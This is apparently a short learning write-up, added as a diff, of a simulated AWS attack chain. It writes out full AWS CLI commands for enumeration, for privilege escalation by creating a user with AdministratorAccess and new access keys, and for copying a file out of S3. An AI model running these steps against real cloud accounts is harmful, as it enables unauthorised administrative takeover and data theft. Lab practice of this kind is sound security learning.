@@ -1,0 +1,36 @@
+Attack Chain Design-1 
+
+Here, I am going to, Simulate a full cloud attack chain by leveraging a compromised IAM user to enumerate AWS services, escalate privileges via IAM misconfiguration, and exfiltrate data from S3.
+
+Attack Flow:
+1. Initial Access:
+IAM credentials compromised (simulated)
+Set via aws configure --profile attacker
+
+2. Recon & Enumeration:
+Commands used:
+aws sts get-caller-identity
+aws iam list-users
+aws s3 ls
+Tools: AWS CLI, Pacu
+
+3. Privilege Escalation:
+Found iam:CreateUser, AttachUserPolicy allowed
+Commands used:
+aws iam create-user --user-name escalated-user
+aws iam attach-user-policy \
+  --user-name escalated-user \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam create-access-key --user-name escalated-user
+
+4. New Access & Role Assumption:
+Used new keys to configure escalated profile
+Verified full access:
+aws ec2 describe-instances --profile escalated
+
+5. S3 Data Exfiltration:
+Listed all buckets, identified sensitive files
+aws s3 cp s3://target-bucket/king.txt ./ --profile escalated
+
+The Above Information is reffered from various websites & chatgpt, The Attack flow is Basic, And Built entirely hands-on by me.
+Here, i learnt various things, what i can do by gaining the access of access & security keys.
